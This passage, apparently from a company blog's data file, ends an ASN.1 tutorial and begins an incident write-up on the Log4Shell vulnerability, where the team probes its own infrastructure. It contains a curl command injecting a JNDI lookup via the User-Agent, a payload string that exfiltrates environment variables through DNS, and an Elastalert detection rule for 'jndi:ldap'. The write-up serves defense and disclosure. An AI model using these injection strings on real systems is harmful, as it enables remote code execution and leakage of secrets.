o-smsFailure                        (2),\\n    o-smsSubmission                     (3),\\n    sms-DeliveryRequested               (11),\\n    t-smsFailure                        (12),\\n    t-smsDelivery                       (13)\\n}\\nMonitorMode ::= ENUMERATED {\\n    interrupted                         (0),\\n    notifyAndContinue                   (1),\\n    transparent                         (2)\\n}\\n\\nSMSEvent ::= SEQUENCE {\\n    eventTypeSMS   [0] EventTypeSMS,\\n    monitorMode    [1] MonitorMode\\n}\\n\\nTone ::= SEQUENCE {\\n    toneID         [0] Integer4,\\n    duration       [1] Integer4 OPTIONAL,\\n    ...\\n}\\n```\\n\\nA value of the `SMSEvent` type have information on both `EventTypeSMS`\\nand `MonitorMode`. The fixed number of fields in the `SEQUENCE` type\\nare ordered.  Context-specific tagging (e.g. the `[0]`, `[1]`, `[2]`\\nstuff in the examples), is frequently applied for the structured\\ntypes, but one could also utilize the keywords `AUTOMATIC TAGGING` in\\nthe module definition.\\n\\n`SEQUENCE OF` on the other hand, holds an arbitrary number of fields\\nof a single type.\\n\\n```asn.1\\nFilterItem ::= CHOICE {\\n    equality         [0] AttributeValueAssertion,\\n    substrings       [1] SEQUENCE {\\n        type    ATTRIBUTE.&id({SupportedAttributes}),\\n        strings SEQUENCE OF CHOICE {\\n            initial [0] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type}),\\n            any     [1] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type}),\\n            final   [2] ATTRIBUTE.&Type({SupportedAttributes}{@substrings.type})\\n        }\\n    },\\n    greaterOrEqual   [2] AttributeValueAssertion,\\n    lessOrEqual      [3] AttributeValueAssertion,\\n    present          [4] AttributeType,\\n    approximateMatch [5] AttributeValueAssertion,\\n    extensibleMatch  [6] MatchingRuleAssertion\\n}\\n```\\n\\nIn the quite complex example above we see that the type `FilterItem`\\nis of type `CHOICE` and can take subtype called `strings`. `strings`\\nis of type `SEQUENCE OF CHOICE` which means it can take a list of\\nzero, one or more of `initial`, `any` or `final`. The example is quite\\ncomplex because it also uses multiple parameterized values. see\\n[Automatic, Implicit, Explicit tags](#automatic-implicit-explicit-tags)\\n\\nWe find another example in the DialoguePDUs module from\\n[Q.773](https://www.itu.int/rec/T-REC-Q.773-199706-I/en) where the\\nAARQ is of type `SEQUENCE`, and the third field `user-information` is\\nan `SEQUENCE OF` `EXTERNAL` type.\\n\\n```asn.1\\nAARQ-apdu ::= [APPLICATION 0] IMPLICIT SEQUENCE {\\n  protocol-version\\n    [0] IMPLICIT BIT STRING {version1(0)} DEFAULT {version1},\\n  application-context-name  [1]  OBJECT IDENTIFIER,\\n  user-information          [30] IMPLICIT SEQUENCE OF EXTERNAL OPTIONAL\\n}\\n```\\n\\nThey are quite different in how they are used, but they are encoded in\\na similar way. Some languages represent `SEQUENCE` internally as a\\n`struct`, and `SEQUENCE OF` as an array, but encoded they would look\\nquite similar.\\n\\n### SET (OF)\\n\\n`SET` and `SET OF` are similar to `SEQUENCE` and `SEQUENCE OF`\\nrespectively. The difference is that the composite types are\\nunordered.\\n\\nFrom `CAP-datatypes` we find an example of a `SET OF` with a\\n[parameterized component](#parameterized-components) specifying a size\\nconstraint.\\n\\n```asn.1\\nGenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&numOfGenericNumbers) OF GenericNumber {bound}\\n```\\n\\nOr an example of a value from the `TCAP-Tools` module in\\n[Q.775](https://www.itu.int/rec/T-REC-Q.775-199706-I/en)\\n\\n```asn.1\\ncancelFailed ERROR ::= {\\n  PARAMETER\\n    SET {problem   [0]  CancelProblem,\\n         invokeId  [1]  present < TCInvokeIdSet\\n    }\\n}\\n```\\n\\n### SELECTION\\n\\nThe SELECTION type `<` is used when one want\'s to obtain one of the\\npossible subtypes of a `CHOICE` definition.\\n\\nIf we expand the previous example from the [SET](#set-of)\\n\\n```asn.1\\ncancel OPERATION ::= {\\n  ARGUMENT  present < TCInvokeIdSet\\n  ERRORS    {cancelFailed}\\n}\\n\\ncancelFailed ERROR ::= {\\n  PARAMETER\\n    SET {problem   [0]  CancelProblem,\\n         invokeId  [1]  present < TCInvokeIdSet\\n    }\\n}\\n```\\n\\nwe see that the `ARGUMENT` type and the invokeId field take the type\\nfrom the `present` field in the `TCInvokeIdSet` type.\\n\\nthe definition of `TCInvokeIdSet` is as follows\\n\\n```asn.1\\nInvokeId ::= CHOICE {present  INTEGER,\\n                     absent   NULL\\n}\\n\\nTCInvokeIdSet ::= InvokeId(WITH COMPONENTS {\\n                             present  (-128..127)\\n                           })\\n```\\n\\nThus `invokeId` and `ARGUMENT` fields will take integer values which\\nare between -128 and 127.\\n\\n# Other concepts\\n\\n## DEFAULT and OPTIONAL keywords\\n\\nOne can use the `DEFAULT` keyword in order to specify the default value.\\n\\n```asn.1\\nCollectedDigits ::= SEQUENCE {\\n  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,\\n  maximumNbOfDigits    [1] INTEGER (1..16),\\n  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,\\n  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,\\n  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,\\n  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,\\n  voiceInformation     [9] BOOLEAN DEFAULT FALSE,\\n  voiceBack            [10] BOOLEAN DEFAULT FALSE\\n}\\n```\\n\\nIn this example we see the type `CollectedDigits` where most of the\\nvalues are either `DEFAULT` or `OPTIONAL`. The only value that needs\\nto be set is `maximumNbOfDigits`.\\n\\n## Classes\\n\\nOne can also use informal object classes in order to specify and\\ndefine values for general types.\\n\\n```asn.1\\nOPERATION ::= CLASS {\\n  &ArgumentType          OPTIONAL,\\n  &argumentTypeOptional  BOOLEAN OPTIONAL,\\n  &returnResult          BOOLEAN DEFAULT TRUE,\\n  &ResultType            OPTIONAL,\\n  &resultTypeOptional    BOOLEAN OPTIONAL,\\n  &Errors                ERROR OPTIONAL,\\n  &Linked                OPERATION OPTIONAL,\\n  &synchronous           BOOLEAN DEFAULT FALSE,\\n  &alwaysReturns         BOOLEAN DEFAULT TRUE,\\n  &InvokePriority        Priority OPTIONAL,\\n  &ResultPriority        Priority OPTIONAL,\\n  &operationCode         Code UNIQUE OPTIONAL\\n}\\nWITH SYNTAX {\\n  [ARGUMENT &ArgumentType\\n   [OPTIONAL &argumentTypeOptional]]\\n  [RESULT &ResultType\\n   [OPTIONAL &resultTypeOptional]]\\n  [RETURN RESULT &returnResult]\\n  [ERRORS &Errors]\\n  [LINKED &Linked]\\n  [SYNCHRONOUS &synchronous]\\n  [ALWAYS RESPONDS &alwaysReturns]\\n  [INVOKE PRIORITY &InvokePriority]\\n  [RESULT-PRIORITY &ResultPriority]\\n  [CODE &operationCode]\\n}\\n\\nprovideRoutingInformation OPERATION ::= {\\n  ARGUMENT  RequestArgument\\n  RESULT    RoutingInformation\\n  ERRORS\\n    {invalidCalledNumber | subscriberNotReachable | calledBarred |\\n      processingFailure}\\n  LINKED    {getCallingPartyAddress}\\n}\\n\\ngetCallingPartyAddress OPERATION ::= {\\n  RESULT  CallingPartyAddress\\n  ERRORS  {callingPartyAddressNotAvailable | processingFailure}\\n}\\n\\ninvalidCalledNumber ERROR ::= {CODE  local:1}\\nsubscriberNotReachable ERROR ::= {CODE  local:2}\\n\\nRequestArgument ::= SEQUENCE {\\n  calledNumber  IsdnNumber,\\n  basicService  BasicServiceIndicator OPTIONAL\\n}\\n\\nRoutingInformation ::= CHOICE {\\n  reroutingNumber    [0] IMPLICIT IsdnNumber,\\n  forwardedToNumber  [1] IMPLICIT IsdnNumber\\n}\\n\\n```\\n\\nIn the above `OPERATION` class, a syntax is defined for the\\nclass. This class and syntax can then be used to define specific\\nvalues, for instance the `provideRoutingInformation` and\\n`getCallingPartyAddress` values.\\n\\nWe also glimse another class in the above example which I didn\'t\\ninclude. Can you find it?\\n\\n## Parameterized components\\n\\nAnother way to make the specs more generalized is to use parameterized\\ncomponents. We\'ve already seen a couple of examples of such, see the\\nchapter for the [NULL](#null), [EXTERNAL](#external) and [SET\\n(OF)](#set-of) types.\\n\\nLet\'s look at the example from `SET OF` again.\\n\\n```asn.1\\nGenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&numOfGenericNumbers) OF GenericNumber {bound}\\n\\nGenericNumber {PARAMETERS-BOUND : bound} ::= OCTET STRING (SIZE(\\n    bound.&minGenericNumberLength .. bound.&maxGenericNumberLength))\\n```\\n\\n`GenericNumbers` take a parameter `bound` of the type `PARAMETERS-BOUND` as input.\\n\\n`PARAMETERS-BOUND` is defined as a class with a lot of different\\ninteger values, so I\'ve minimized the class a bit.\\n\\n```asn.1\\nPARAMETERS-BOUND ::= CLASS {\\n    --- a lot of other fields\\n    &minGenericNumberLength  INTEGER,\\n    &maxGenericNumberLength  INTEGER,\\n    &numOfGenericNumbers     INTEGER,\\n}\\n\\nWITH SYNTAX {\\n    --- a lot of other fields\\n    MINIMUM-FOR-GENERIC-NUMBER  &minGenericNumberLength\\n    MAXIMUM-FOR-GENERIC-NUMBER  &maxGenericNumberLength\\n    NUM-OF-GENERIC-NUMBERS      &numOfGenericNumbers\\n}\\n```\\n\\nOne could then specify different values using the `PARAMETERS-BOUND`\\nclass to reuse the `GenericNumber` and `GenericNumbers` types.\\n\\n```asn.1\\ncAPSpecificBoundSet PARAMETERS-BOUND ::= {\\n    --- again, lots of other values\\n    MINIMUM-FOR-GENERIC-NUMBER                  3\\n    MAXIMUM-FOR-GENERIC-NUMBER                  11\\n    NUM-OF-GENERIC-NUMBERS                      5\\n}\\n```\\n\\nIf one would pass `cAPSpecificBoundSet` to a value of type\\n`GenericNumbers`, it would define an instance which holds 1-5\\n`GenericNumber`s of 3-11 octets.\\n\\nQuite powerful if you have multiple definitions which uses similar\\nstructure.\\n\\n## Extensions\\n\\nSometimes you will need to support different versions of a protocol\\n(or someone else need to support different version, and you just need\\nto read the types of the protocol), and maybe the new version need to\\nextend some types in order to include more information. Then without\\nredefining everything and copy the previous version of the type to the\\nnew version of the type one can use extension markers (syntax `...`).\\n\\nTake the `QosMonitoringRequest` type below as an example. In the first\\nversion of the protocol (NGAP if you really want to know), the\\n`QoSMonitoringRequest` could take only enums `ul`, `dl`, or `both`.\\nHowever, in a subsequent version it was extended with a new enum\\n`stop`. With the extension marker `...` the v1-compilers can handle\\nthe first three enums, and the v2-compilers can handle all enums from\\nv1 but also the `stop` enum.\\n\\n```asn.1\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...\\n} -- version 1\\n\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...,\\n    stop\\n} -- version 2\\n```\\n\\nFor enums, if there is yet a newer version, say version 3 of this type\\none, you should just add the new enum under the previous enums.\\n\\n```asn.1\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...,\\n    stop,\\n    half\\n} -- imaginary version 3\\n```\\n\\nFor `SEQUENCE`, `SET` and `CHOICE` one could either do the same, or to\\nkeep the versions separated, add another extension mark with the new\\nfields in between. One could also add version brackets to group the\\nextensions and highlight the differences.\\n\\n```asn.1\\nAx ::= SEQUENCE {\\n    a INTEGER (250..253),\\n    b BOOLEAN,\\n    c CHOICE {\\n        d INTEGER, -- version 1\\n        ...,\\n        [[\\n            e BOOLEAN,\\n            f IA5String\\n        ]],\\n        ... -- version 2\\n    },\\n    ..., -- version 1\\n    [[\\n        g NumericString (SIZE(3)),\\n        h BOOLEAN OPTIONAL\\n    ]],\\n    ..., -- version 2\\n    i BMPString OPTIONAL,  -- version 3\\n    j PrintableString OPTIONAL -- version 3\\n}\\n\\n```\\n\\nOnly the types `ENUMERATED`, `SEQUENCE`, `SET` and `CHOICE`, as well\\nas subtype constraints, and object and value sets can be extended.\\n\\n## Automatic, Implicit, Explicit tags\\n\\nWhen an value is transmitted all ambiguities need to be removed. That\\nis why every type needs to have an unique identifier, called a tag.\\n\\nThe section [DEFAULT and OPTIONAL\\nkeywords](#default-and-optional-keywords) has a good example I will\\nexplain.\\n\\n\\n```asn.1\\nCollectedDigits ::= SEQUENCE {\\n  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,\\n  maximumNbOfDigits    [1] INTEGER (1..16),\\n  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,\\n  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,\\n  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,\\n  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,\\n  voiceInformation     [9] BOOLEAN DEFAULT FALSE,\\n  voiceBack            [10] BOOLEAN DEFAULT FALSE\\n}\\n```\\n\\nIn this sequence we can see that many of the values are optional and\\nsome have defaults, only the value `maximumNbOfDigits` is mandatory.\\n\\nWhen the sending side transmits a value of `CollectedDigits` type, the\\nreceiving side will get a sequence of the values mentioned. With\\nBER-encoding each defined value will have an identifier, a length (of\\nthe value transmitted) and the value. This is called a\\nTag-Length-Value or TLV for short.\\n\\nAll basic types already has an universal tag as stated in the [types\\ntable](#types), but the composite types does not. (If not tagged, how\\nwould it see the difference between `endOfReplyDigit`, `cancelDigit`\\nand `startDigit` in the example above?)\\n\\n```asn.1\\nRoutingInformation ::= CHOICE {\\n  reroutingNumber    [0] IMPLICIT IsdnNumber,\\n  forwardedToNumber  [1] IMPLICIT IsdnNumber\\n}\\n\\nIsdnNumber ::= SEQUENCE {\\n  typeOfAddress  TypeOfAddress,\\n  digits         TelephonyString\\n}\\n\\nTypeOfAddress ::= ENUMERATED {national(0), international(1), private(2)}\\n\\nTelephonyString ::=\\n  IA5String\\n    (FROM (\\"0\\" | \\"1\\" | \\"2\\" | \\"3\\" | \\"4\\" | \\"5\\" | \\"6\\" | \\"7\\" | \\"8\\" | \\"9\\" | \\"*\\" |\\n           \\"#\\"))(SIZE (1..15))\\n\\n```\\n\\nA value of `RoutingInformation` in this example will with BER encoding\\nonly transmit the tag `[0]` or `[1]` (and of course the length and\\nvalue). It counts on that the receiving part has the same version of\\nthe ASN.1 and knows the abstract syntax. If it wouldn\'t have been\\n`IMPLICIT`, then it would have sent either tags `[0]` or `[1]`\\nfollowed by the tags for `TypeOfAddress` (ENUMERATED) `[10]`, and tags\\nfor `TelephonyString` (IA5String) `[4]`.\\n\\nOne can specify `IMPLICIT` and `EXPLICIT` tagging on module basis,\\nwhere the `DEFINITIONS` are assigned.\\n\\n```asn.1\\nDEFINITIONS IMPLICIT TAGS ::= BEGIN\\n```\\n\\nInstead of writing all the tags self (explicitly in both cases), one\\ncan instead use the keywords `AUTOMATED TAGS`.\\n\\n```asn.1\\nDEFINITIONS AUTOMATIC TAGS ::= BEGIN\\n```\\n\\nThis will add tags to the composit types that doesn\'t have them\\n(explicitly) set.\\n\\n## Deprecations and discouragements\\n\\nSome things have been deprecated from earlier ASN.1 specifications,\\nand use of these are strongly discouraged.\\n\\n### ANY\\n\\nFirst out is the `ANY` type, which could take the form of any\\nvalue. It\'s like an unrestricted `CHOICE` type.\\n\\n```asn.1\\nInvoke ::= SEQUENCE {\\n    invokeID           InvokeIdType,\\n    linkedID       [0] InvokeIdType OPTIONAL,\\n    operationCode      MAP-OPERATION,\\n    parameter          InvokeParameter OPTIONAL\\n}\\nInvokeParameter ::= ANY\\n```\\n\\nProblem with this is that the ASN.1 compiler does not have a formal\\nway of knowing which values are approved. The use of `ANY` also\\nusually meant it was coupled with some other value, for instance the\\n`operationCode` in the example above.\\n\\nTo make this link one could have used `DEFINED BY` specifying which\\nfield the `ANY` type is coupled with. The drawback with this solution\\nis that it still has an ambiguous meaning, and the types are of no use\\nfor the application designer.\\n\\n```asn.1\\nExtensionField ::= SEQUENCE {\\n    type        INTEGER,\\n    --  shall identify the value of an EXTENSION type\\n    criticality ENUMERATED {\\n        ignore(0),\\n        abort(1)\\n    } DEFAULT ignore,\\n    value   [1] ANY DEFINED BY type\\n}\\n```\\n\\nInstead the concept of informal object classes and parameterized\\ncomponents were introduced.\\n\\n### Macros\\n\\nMacros were removed because they were poorly documented and too\\ngeneral. Because of this they were hard to implement and automate in\\nthe compilers. They follow the BNF notation.\\n\\n```asn.1\\nOPERATION MACRO ::=\\nBEGIN\\n    TYPE NOTATION ::= Parameter Result Errors LinkedOperations\\n    VALUE NOTATION ::= value (VALUE CHOICE { localValue INTEGER, globalValue OBJECT IDENTIFIER } )\\n    Parameter ::= ArgKeyword NamedType | empty\\n    ArgKeyword ::= \\"ARGUMENT\\" | \\"PARAMETER\\"\\n    Result ::= \\"RESULT\\" ResultType | empty\\n    Errors ::= \\"ERRORS\\" \\"{\\"ErrorNames\\"}\\" | empty\\n    LinkedOperations ::= \\"LINKED\\" \\"{\\"LinkedOperationNames\\"}\\" | empty\\n    ResultType ::= NamedType | empty\\n    ErrorNames ::= ErrorList | empty\\n    ErrorList ::= Error | ErrorList \\",\\" Error\\n    Error ::= value (ERROR)\\n             -- shall reference an error value\\n             | type\\n             -- shall reference an error type\\n             -- if no error value is specified\\n    LinkedOperationNames ::= OperationList | empty\\n    OperationList ::= Operation | OperationList \\",\\" Operation\\n    Operation ::= value (OPERATION)\\n                  -- shall reference an operation value\\n                  | type\\n                  -- shall reference an operation type if\\n                  -- no operation value is specified\\n    NamedType ::= identifier type | type\\nEND\\n```\\n\\nThe two needed fields of the macro are `TYPE NOTATION` and `VALUE\\nNOTATION`. The rest of the fields are the value sequence defining what\\nthe macro should insert. Quotes define the string to insert (excluding\\nthe actual quotes), `empty` inserts nothing. `identifier`, `value`, or\\n`type` are used to infer different things. Dubuisson has (yet again) a\\ngood chapter on this topic.\\n\\nAlso here one should use informal object classes and parameterized\\ncomponents instead of using macros.\\n\\n# Encodings\\n\\nThere are numerous codecs when transmitting the abstract syntax, all\\nwith different pros and cons.\\n\\n| Short name | Long name                    |\\n| ---------- | ---------------------------- |\\n| BER        | Basic encoding rules         |\\n| DER        | Distinguished encoding rules |\\n| CER        | Canonical encoding rules     |\\n| PER        | Packed encoding rules        |\\n| OER        | Octet encoding rules         |\\n| XER        | XML encoding rules           |\\n| EXER       | Extended XML encoding rules  |\\n| JER        | JSON encoding rules          |\\n\\n\\nBER is the oldest encoding rule for ASN.1. It uses Tag-Length-Value\\nformat where all tags, lengths and values are multiples of\\noctets. Because this was the first encoding rule it was named `basic`\\nto indicate that there might be more standardized encoding rules in\\nthe future.\\n\\nDER and CER are subsets of BER, which was added for developers of\\nX.400 email and X.500 directory applications. It provides means to\\nmake sure bit strings are not altered during transfer. The main\\ndifference between DER and CER is that DER uses a definite-length\\nformat and CER an indefinite-length format, so CER is best used for\\napplications that transfer a big amount of data.\\n\\nPER is the most compact format, and used for bandwith conservation. It\\ndoes not send the Tag of the TLV because the order in which components\\nof the message occur is known.  PER also does not send the Length of\\nthe TLV if the Value has a fixed length. It uses information from\\nASN.1 message description to eliminate redundant information from the\\nValue portion. It can either be aligned to multiple of octets by\\npadding each value with \'0\'s, or unaligned (U-PER/Unaligned PER) which\\nis more compact but take more time to decode.\\n\\nOER was adapted from PER and uses an octet oriented format, so the\\nlength of all specified Tags, Lengths, and Values are padded to be\\nmultiples of 8 bits octets as in BER. OER is usually faster than both\\nBER and PER with regards to encoding and decoding.\\n\\nXER, CXER and EXER are used for transmitting XML format. CXER is used\\nfor transmitting data canonically, e.g. used by security applications.\\nEXER or Extended XER is used when \\"stylish\\" features is wanted, and\\nadds possibility to extend the encoder for instance when wanting to\\ninsert processing instructions or comments into the XML.\\n\\nJER is used when transmitting JSON in accordance to the format\\nspecified in ECMA 404. \\n\\nThere are probably a bunch of others as well, but these are the ones\\nthat have a specification.\\n\\n| ITU-T number                                                                           | Name                                                                                                                                     |\\n| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |\\n| [X.690](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.690) | ASN.1 encoding rules: Specification of Basic Encoding Rules (BER), Canonical Encoding Rules (CER) and Distinguished Encoding Rules (DER) |\\n| [X.691](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.691) | ASN.1 encoding rules: Specification of Packed Encoding Rules (PER)                                                                       |\\n| [X.692](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.692) | ASN.1 encoding rules: Specification of Encoding Control Notation (ECN)                                                                   |\\n| [X.693](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.693) | ASN.1 encoding rules: XML Encoding Rules (XER)                                                                                           |\\n| [X.694](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.694) | ASN.1 encoding rules: Mapping W3C XML schema definitions into ASN.1                                                                      |\\n| [X.695](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.695) | ASN.1 encoding rules: Registration and application of PER encoding instructions                                                          |\\n| [X.696](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.696) | ASN.1 encoding rules: Specification of Octet Encoding Rules (OER)                                                                        |\\n| [X.697](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.697) | ASN.1 encoding rules: Specification of JavaScript Object Notation Encoding Rules (JER)                                                   |\\n\\n# Final words\\n\\nCongratulations for making through this blog post. You deserve a\\nmedal, and I hope this can help you understand the complexity and\\ngreatness of ASN.1.\\n\\nWe have gone through the **basics** of ASN.1, there are still a lot of\\nthings to be uncovered. You now understand the most common basic and\\nstructured types, as well as the main differences between the\\ndifferent encodings.\\n\\nIf I write a part 2 I will take you through the Diameter specs\\ninstead, which are much more straighforward.\\n\\nImage from [xkcd](https://xkcd.com) describing how I feel with ASN.1:\\n<a class=\\"image\\" href=\\"https://xkcd.com/208/\\"><img src=\\"https://imgs.xkcd.com/comics/regular_expressions.png\\" /></a>"},{"id":"log4j-security-vulnerability","metadata":{"permalink":"/blog/log4j-security-vulnerability","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-12-17-log4j-security-vulnerability.md","source":"@site/../blog/2021-12-17-log4j-security-vulnerability.md","title":"Zero-day vulnerabilities - Log4j","description":"On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as \u201cLog4Shell\u201d in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.","date":"2021-12-17T00:00:00.000Z","formattedDate":"December 17, 2021","tags":[{"label":"security","permalink":"/blog/tags/security"},{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"vulnerability","permalink":"/blog/tags/vulnerability"}],"readingTime":9.79,"hasTruncateMarker":true,"authors":[{"name":"Jonny Griffin","title":"Security Tech Lead","url":"https://www.linkedin.com/in/jonnathangriffin/","imageURL":"/img/author-photos/jg.jpg","key":"jonny-griffin"},{"name":"Yan Grunenberger","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/yangrunenberger/","imageURL":"/img/author-photos/yg.jpg","key":"yan"}],"frontMatter":{"slug":"log4j-security-vulnerability","title":"Zero-day vulnerabilities - Log4j","date":"2021-12-17T00:00:00.000Z","tags":["security","infrastructure","vulnerability"],"authors":["jonny-griffin","yan"]},"prevItem":{"title":"The specs behind the specs part 1","permalink":"/blog/the-specs-behind-the-specs-part-1"},"nextItem":{"title":"CKH IOD selects Working Group Two for public cloud core network","permalink":"/blog/ckh-iod-wg2-public-cloud"}},"content":"On Friday, December 10th, **wgtwo** and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as \u201cLog4Shell\u201d in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.\\n\\n\x3c!--truncate--\x3e\\n## Friday\\n\\nMitigating 3rd party vulnerabilities is an ability that **wgtwo** has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture.\\n\\nWe knew that all versions of Log4j `2.0-beta9 <= Apache log4j <= 2.14.1` were affected.\\n\\n### Code\\n\\nNaturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.\\n\\n### Docker Vulnerability Scan Day 1\\n\\nWe use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry.\\n\\nAt a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy\u2019s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified.\\n\\n## Saturday\\n\\n### Checking our infrastructure ourselves with DNS requests\\n\\nAt that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.\\n\\nOne harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:\\n\\n![](/img/blog/log4j/01-canary-tokens.png)\\n\\nIf a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:\\n\\n```\\ncurl https://docs.wgtwo.com  -A \\"\\\\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}\\"\\n```\\n\\nAfter executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.\\n\\nJNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world.\\n\\nGoing back to our problem, we quickly found this [Rogue JNDI](https://github.com/veracode-research/rogue-jndi). This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:\\n\\n![](/img/blog/log4j/02-supported-payloads.png)\\n\\nIn particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as:\\n\\n```\\n${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}\\n```\\n\\nThen, we should proceed to:\\n1) Identify if the affected components are in our stack or in the cloud provider\\n2) Apply mitigation\\n- Either via WAF - firewall rules on traffic.\\n- Either via known mitigation on the log4g components\\n  - Environment variable / JVM options\\n  - Java class removal\\n  - Full component upgrade\\n\\nFor (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j.\\n\\nAssuming this was the only element, we proceed to apply mitigation:\\nWe discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the `jndi:ldap` string used to trigger the vulnerability.\\nThe environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.\\nJava class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.\\n\\n### Log Analysis and Alerting\\n\\nJust after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. `${jndi`\\n\\nCloudflare wrote a great [blog post](https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/) about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.\\n\\nFor us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by [AWS Security Bulletin](https://aws.amazon.com/security/security-bulletins/AWS-2021-006/).\\n\\nTo get some ChatOps alerts in slack we use an open-source tool called [Elstalert](https://github.com/Yelp/elastalert). This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure.\\n\\nTo get started, we built the following Elastalert rule:\\n```yaml\\nlog4j.yaml: |-\\n  ---\\n  name: \\"log4j cve\\"\\n  index: logstash-*\\n  type: any\\n  realert:\\n    minutes: 15\\n  filter:\\n  - query:\\n    - query_string:\\n        query: \\"\\\\\\"jndi:ldap\\\\\\"\\"\\n  query_delay:\\n    minutes: 5\\n  query_key: \\"message\\"\\n  alert_text_type: alert_text_only\\n  include : [\\"kubernetes.container.name\\",\\"message\\"]\\n  alert:\\n  - \\"slack\\"\\n  alert_text: \\"\\n  *Container* : {0}\\\\n\\n  *Message* : {1}\\"\\n  alert_text_args: [\\"kubernetes.container.name\\",\\"message\\"]\\n  slack_channel_override: 